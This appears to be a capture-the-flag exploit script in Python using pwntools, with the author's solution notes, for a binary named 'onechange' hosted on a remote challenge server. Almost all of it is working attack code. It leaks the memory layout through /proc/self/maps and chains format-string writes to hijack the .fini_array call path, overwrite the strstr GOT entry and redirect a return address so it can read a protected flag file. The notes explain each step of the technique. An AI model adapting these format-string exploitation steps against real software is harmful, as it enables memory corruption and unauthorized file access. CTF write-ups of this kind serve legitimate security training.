# Due to a lot of bytes transmitted, there should be error in sometime.
# So you should run this cript several time to see the result 

from pwn import *

local = False

if local:
	r = process("./onechange")
else:
	# nc 103.237.99.35 28995	
	r = remote("103.237.99.35", 28995)

def calc(r12_2byte):
	payload = ""
	for i in range(r12_2byte/0xf00):
		payload += "%3840x" + "%42$hn"
	remain = r12_2byte - 0xf00* (r12_2byte/0xf00)
	payload += "%{}x".format(remain) + "%42$hn"	
	return payload

main_off = 0x9ba
strstr_got = 0x202070
fini = 0x201df0
tmp = 0x2020c0

# leak vmmap
r.recvuntil("right !!")
payload = "/proc/self/maps"
r.sendline(payload)
result = r.recvuntil("number ?")

# leak code_base
code_base = result.split("/proc/self/maps")[1][1:13]
code_base = int("0x"+code_base, 16)
# debug purpose
#print "printf: " + hex(code_base + 0xb8e)

# leak stack_base
# difference libc version on local and remote
#stack_base = result.split("/lib/x86_64-linux-gnu/ld-2.23.so")[3]
stack_base = result.split("/lib/x86_64-linux-gnu/ld-2.19.so")[3]
stack_base = stack_base.split("\n")[2][0:12]
stack_base = int("0x" + stack_base, 16)
	
# send 4 input to bss
r.sendline("5")
print r.recv()	

# after code_base change it will call main() in tmp+100 instead of _fini.array
r.sendline(p64(code_base + main_off))   # 2

# 27 point to 53
# leak esp of main
r.sendline("%27$lx")   # 3

# change code_base value
# Due to PIE is ON so when each time it need addr of binary, it goes to 42$ to take code_base and add to offset
# change code_base so when it call a function in _fini.array it call a function in tmp+100 instead
# format string
r12_2byte = (code_base & 0xffff) + tmp - fini + 100
payload = calc(r12_2byte)
r.sendline(payload)   # 4

r.sendline("nof")  # 5

result = r.recvuntil("nof")

# calculate esp_main_2, ret_main_2
esp_main_1 =  result[6:18]
esp_main_1 = int("0x"+esp_main_1, 16)
esp_main_1 = esp_main_1 - (53-6)*8
#print hex(esp_main_1)
esp_main_2 = esp_main_1 - 0x110
ebp_main_2 = esp_main_2 + 0x90
ret_main_2 = ebp_main_2 + 0x8 + 4*8

# debug purpose
#print "esp_main_2: " + hex(esp_main_2) 
#print "ret_main_2: " + hex(ret_main_2)

# now we have stack value from first call in main
# make use of input of file name, insert stack value and address where we want to change into stack ---> format string 
# be careful with fgets(): recv "\n" and add "\x00" after that
payload = "/bin/rm" + "x" + p64(0)
payload += p64(esp_main_2 + 0x28 + 4*8) + p64(code_base + strstr_got)   # 10$ 11$
payload += p64(ret_main_2 + 0)   # 12$
payload += p64(ret_main_2 + 1)   # 13$
payload += p64(ret_main_2 + 2)   # 14$
payload += p64(ret_main_2 + 3)   # 15$
payload += p64(ret_main_2 + 4)   # 16$
payload += p64(ret_main_2 + 5)   # 17$


r.sendline(payload)
r.recvuntil("number ?")

r.sendline("14")

# overwrite ret of main_2 to main instead of dl_fini
main = code_base + main_off
#print "main: " + hex(main)
m1 = main & 0xff
m2 = (main & 0xff00)/0x100
m3 = (main & 0xff0000)/0x10000
m4 = (main & 0xff000000)/0x1000000
m5 = (main & 0xff00000000)/0x100000000
m6 = (main & 0xff0000000000)/0x10000000000

payload = "%{}x".format(m1) + "%12$hhn"
payload += "%{}x".format(256 - m1 + m2) + "%13$hhn"
payload += "%{}x".format(256 - m2 + m3) + "%14$hhn"
payload += "%{}x".format(256 - m3 + m4) + "%15$hhn"
payload += "%{}x".format(256 - m4 + m5) + "%16$hhn"
payload += "%{}x".format(256 - m5 + m6) + "%17$hhn"
r.sendline(payload)   # 2

# overwrite strstr_got to passby "flag"
#payload = "10-%10$lx 11-%11$lx"
new_strstr_got = 0xa4f + code_base
m1 = new_strstr_got & 0xff
m2 = (new_strstr_got & 0xff00)/0x100
m3 = (new_strstr_got & 0xff0000)/0x10000
m4 = (new_strstr_got & 0xff000000)/0x1000000
m5 = (new_strstr_got & 0xff00000000)/0x100000000
m6 = (new_strstr_got & 0xff0000000000)/0x10000000000

# debug purpose
#print "strstr_got: " + hex(code_base + strstr_got)
#print "main_x: " + hex(new_strstr_got)

payloadx = "%{}x".format(m1) + "%11$hhn"
r.sendline(payloadx)   # 3

payloady = "%{}x".format(0x71) + "%10$hhn"
r.sendline(payloady)   # 4
payloadx = "%{}x".format(m2) + "%11$hhn"
r.sendline(payloadx)   # 5

payloady = "%{}x".format(0x72) + "%10$hhn"
r.sendline(payloady)   # 6
payloadx = "%{}x".format(m3) + "%11$hhn"
r.sendline(payloadx)   # 7

payloady = "%{}x".format(0x73) + "%10$hhn"
r.sendline(payloady)   # 8
payloadx = "%{}x".format(m4) + "%11$hhn"
r.sendline(payloadx)   # 9

payloady = "%{}x".format(0x74) + "%10$hhn"
r.sendline(payloady)   # 10
payloadx = "%{}x".format(m5) + "%11$hhn"
r.sendline(payloadx)   # 11

payloady = "%{}x".format(0x75) + "%10$hhn"
r.sendline(payloady)   # 12
payloadx = "%{}x".format(m6) + "%11$hhn"
r.sendline(payloadx)   # 13

r.sendline(" abcd")    # 14

print r.recvuntil("abcd")

print r.recvuntil("right !!")

# flag NOT working, "/home/onechange/flag" does
r.sendline("/home/onechange/flag")

print r.recv()
print r.recv()
print r.recv()



'''
NOTE1: important value in stack (when PIE ON), when PIE OFF, it's zero
- when PIE ON/OFF, there is a value of mapped memory area store in stack, in that mapped area it stores the base_code addr,
when it calls a function involving code of binary, it take this base_code address and add with the offset. So with format string,
we can change this base_code to .got or .bss or plt or .fini 
stack    : mapped    --> 0x55555554000
0x7fff...: 0x7fee... --> 0x55555554000
'''

'''
NOTE2: fucking remote machine
- The stack addr of local and remote machine is completely difference
- We don't have libc file so it will be harder
'''

'''
NOTE3: my wasting time
1. Find a pointer in stack point to a address in stack ---> fail because esp change and i don't know how and why
2. Don't know the value store code_base in stack
3. Format string work
4. Max Buffer is 4096 byte (0xffx), so max is to byte 
'''

'''
NOTE4: the way to solve
0. Use /proc/self/maps to leak all base_addr
1. No libc, no system -> bypass strstr to open flag file -> overwrite strstr_got
2. make use of _fini.array to  return to main
2.1: to call a function in _fini.array, it will call _dl_fini() function
2.2: to call this func, it have to have code_base addr
2.3: code_base addr store in mapped area but mapped area addr store in stack
2.4: with format string we can overwrite 2byte of code_base
2.5: write main addr to &(tmp+100)
2.6: after change code_base, _dl_fini not call .fini.arr in .fini section anymore,
	and it will call in .bss section in &(tmp+100) and then return to main
3. Now we have addr of esp, calculate esp of main_2, use file_name to insert addr where we want to overrite into stack,
after that these value will be in stack and we can use format string.
4. we need to change 2 value:
4.1: strstr_got to bypass "flag" in file_name
4.2: return addr of main_2: _dl_fini + 0xxx to main again to open /home/onechange/flag file
4.2: with that to addr we need to change 12yte (6+6), so we need 12 addr in stack,
	but we don't have that room, so we can use 8 addr (6+2)
4.3: 6 addr continuing and 1 stack_addr and 1 strstr_got_addr
4.4: use stack_addr to increase strstr_got_addr (6 time), 
     use strstr_got_addr to overwrite 1 byte of strstr_got each time
5. After overwrite second value: it will call main 3rd, and now strstr_got was overwritten so not work anymore,
   and now we can input file_name: /home/onechange/flag, note flag not working      
'''


'''
NOTE5: learn
- ln, hhn, hn, lx
- value of code_base (PIE) in stack  <-- good_target
- _dl_fini call .fini.arr and the way calculate .fini.arr address
- poiter to poiter :lol
'''